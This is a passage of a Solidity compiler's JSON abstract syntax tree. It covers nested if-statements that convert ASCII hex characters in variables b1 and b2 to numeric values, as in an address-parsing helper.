																					"src": "8607:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 795,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "8607:17:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 787,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "8599:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_uint160_$",
																			"typeString": "type(uint160)"
																		},
																		"typeName": {
																			"id": 786,
																			"name": "uint160",
																			"nodeType": "ElementaryTypeName",
																			"src": "8599:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 796,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "8599:26:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint160",
																		"typeString": "uint160"
																	}
																},
																"src": "8594:31:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint160",
																	"typeString": "uint160"
																}
															},
															"id": 798,
															"nodeType": "ExpressionStatement",
															"src": "8594:31:0"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 807,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 801,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 799,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 749,
																				"src": "8644:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 800,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8650:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "8644:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 802,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8643:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 805,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 803,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 749,
																				"src": "8658:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 804,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8664:3:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "8658:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 806,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8657:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "8643:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 821,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 815,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 813,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 749,
																					"src": "8722:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 814,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8728:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "8722:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 816,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8721:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 819,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 817,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 749,
																					"src": "8736:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 818,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8742:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "8736:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 820,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8735:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "8721:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 835,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 829,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 827,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 749,
																						"src": "8799:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 828,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8805:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "8799:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 830,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "8798:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 833,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 831,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 749,
																						"src": "8813:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 832,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8819:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "8813:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 834,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "8812:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "8798:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 841,
																	"nodeType": "IfStatement",
																	"src": "8794:71:0",
																	"trueBody": {
																		"id": 840,
																		"nodeType": "Block",
																		"src": "8824:41:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 838,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 836,
																						"name": "b1",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 749,
																						"src": "8842:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 837,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "8848:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "8842:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 839,
																				"nodeType": "ExpressionStatement",
																				"src": "8842:8:0"
																			}
																		]
																	}
																},
																"id": 842,
																"nodeType": "IfStatement",
																"src": "8717:148:0",
																"trueBody": {
																	"id": 826,
																	"nodeType": "Block",
																	"src": "8747:41:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 824,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 822,
																					"name": "b1",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 749,
																					"src": "8765:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 823,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8771:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "8765:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 825,
																			"nodeType": "ExpressionStatement",
																			"src": "8765:8:0"
																		}
																	]
																}
															},
															"id": 843,
															"nodeType": "IfStatement",
															"src": "8639:226:0",
															"trueBody": {
																"id": 812,
																"nodeType": "Block",
																"src": "8670:41:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 810,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 808,
																				"name": "b1",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 749,
																				"src": "8688:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "Assignment",
																			"operator": "-=",
																			"rightHandSide": {
																				"argumentTypes": null,
																				"hexValue": "3837",
																				"id": 809,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8694:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_87_by_1",
																					"typeString": "int_const 87"
																				},
																				"value": "87"
																			},
																			"src": "8688:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			}
																		},
																		"id": 811,
																		"nodeType": "ExpressionStatement",
																		"src": "8688:8:0"
																	}
																]
															}
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"id": 852,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 846,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 844,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 752,
																				"src": "8883:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": ">=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3937",
																				"id": 845,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8889:2:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_97_by_1",
																					"typeString": "int_const 97"
																				},
																				"value": "97"
																			},
																			"src": "8883:8:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 847,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8882:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "&&",
																"rightExpression": {
																	"argumentTypes": null,
																	"components": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint160",
																				"typeString": "uint160"
																			},
																			"id": 850,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 848,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 752,
																				"src": "8897:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<=",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "313032",
																				"id": 849,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "8903:3:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_102_by_1",
																					"typeString": "int_const 102"
																				},
																				"value": "102"
																			},
																			"src": "8897:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		}
																	],
																	"id": 851,
																	"isConstant": false,
																	"isInlineArray": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "TupleExpression",
																	"src": "8896:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"src": "8882:25:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": {
																"condition": {
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"id": 866,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 860,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 858,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 752,
																					"src": "8961:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": ">=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3635",
																					"id": 859,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8967:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_65_by_1",
																						"typeString": "int_const 65"
																					},
																					"value": "65"
																				},
																				"src": "8961:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 861,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8960:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "&&",
																	"rightExpression": {
																		"argumentTypes": null,
																		"components": [
																			{
																				"argumentTypes": null,
																				"commonType": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				},
																				"id": 864,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftExpression": {
																					"argumentTypes": null,
																					"id": 862,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 752,
																					"src": "8975:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "BinaryOperation",
																				"operator": "<=",
																				"rightExpression": {
																					"argumentTypes": null,
																					"hexValue": "3730",
																					"id": 863,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "8981:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_70_by_1",
																						"typeString": "int_const 70"
																					},
																					"value": "70"
																				},
																				"src": "8975:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bool",
																					"typeString": "bool"
																				}
																			}
																		],
																		"id": 865,
																		"isConstant": false,
																		"isInlineArray": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "TupleExpression",
																		"src": "8974:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"src": "8960:24:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																"falseBody": {
																	"condition": {
																		"argumentTypes": null,
																		"commonType": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		},
																		"id": 880,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"leftExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 874,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 872,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 752,
																						"src": "9038:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": ">=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 873,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9044:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9038:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 875,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9037:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"nodeType": "BinaryOperation",
																		"operator": "&&",
																		"rightExpression": {
																			"argumentTypes": null,
																			"components": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					},
																					"id": 878,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"id": 876,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 752,
																						"src": "9052:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "<=",
																					"rightExpression": {
																						"argumentTypes": null,
																						"hexValue": "3537",
																						"id": 877,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9058:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_57_by_1",
																							"typeString": "int_const 57"
																						},
																						"value": "57"
																					},
																					"src": "9052:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_bool",
																						"typeString": "bool"
																					}
																				}
																			],
																			"id": 879,
																			"isConstant": false,
																			"isInlineArray": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"nodeType": "TupleExpression",
																			"src": "9051:10:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"src": "9037:24:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"falseBody": null,
																	"id": 886,
																	"nodeType": "IfStatement",
																	"src": "9033:71:0",
																	"trueBody": {
																		"id": 885,
																		"nodeType": "Block",
																		"src": "9063:41:0",
																		"statements": [
																			{
																				"expression": {
																					"argumentTypes": null,
																					"id": 883,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftHandSide": {
																						"argumentTypes": null,
																						"id": 881,
																						"name": "b2",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 752,
																						"src": "9081:2:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint160",
																							"typeString": "uint160"
																						}
																					},
																					"nodeType": "Assignment",
																					"operator": "-=",
																					"rightHandSide": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 882,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "9087:2:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"src": "9081:8:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"id": 884,
																				"nodeType": "ExpressionStatement",
																				"src": "9081:8:0"
																			}
																		]
																	}
																},
																"id": 887,
																"nodeType": "IfStatement",
																"src": "8956:148:0",
																"trueBody": {
																	"id": 871,
																	"nodeType": "Block",
																	"src": "8986:41:0",
																	"statements": [
																		{
																			"expression": {
																				"argumentTypes": null,
																				"id": 869,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": false,
																				"lValueRequested": false,
																				"leftHandSide": {
																					"argumentTypes": null,
																					"id": 867,
																					"name": "b2",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 752,
																					"src": "9004:2:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint160",
																						"typeString": "uint160"
																					}
																				},
																				"nodeType": "Assignment",
																				"operator": "-=",
																				"rightHandSide": {
																					"argumentTypes": null,
																					"hexValue": "3535",
																					"id": 868,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"kind": "number",
																					"lValueRequested": false,
																					"nodeType": "Literal",
																					"src": "9010:2:0",
																					"subdenomination": null,
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_55_by_1",
																						"typeString": "int_const 55"
																					},
																					"value": "55"
																				},
																				"src": "9004:8:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
																					"typeString": "uint160"
																				}
																			},
																			"id": 870,
																			"nodeType": "ExpressionStatement",
																			"src": "9004:8:0"
																		}
																	]
																}
															},
															"id": 888,
															"nodeType": "IfStatement",
															"src": "8878:226:0",
															"trueBody": {
																"id": 857,
																"nodeType": "Block",
																"src": "8909:41:0",
																"statements": [
																	{
																		"expression": {
																			"argumentTypes": null,
																			"id": 855,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftHandSide": {
																				"argumentTypes": null,
																				"id": 853,
																				"name": "b2",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 752,
																				"src": "8927:2:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint160",
